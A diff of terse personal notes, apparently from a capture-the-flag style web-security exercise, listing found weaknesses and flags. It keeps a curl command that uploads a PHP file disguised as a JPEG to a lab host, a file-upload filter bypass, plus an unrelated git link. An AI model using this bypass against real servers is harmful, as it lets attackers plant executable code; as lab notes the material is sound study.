@@ -27,11 +27,11 @@ refaire hidden flag script
 11 redirect | redirect                  ok      8
 12 hidden file | hidden_flag            ok      2
 13 survey   | survey_form               ok      5
-14 recover| mail change                 ok      1  
+14 recover| mail change                 ok      1      d
 
 
 curl -X POST 'http://10.2.8.38/?page=upload' -F 'uploaded=@/Users/lgarcia-/test.php;type=image/jpeg' -F 'Upload=Upload'
-
+https://stackoverflow.com/questions/65452861/merging-master-into-main-branch
 
 
 bonus
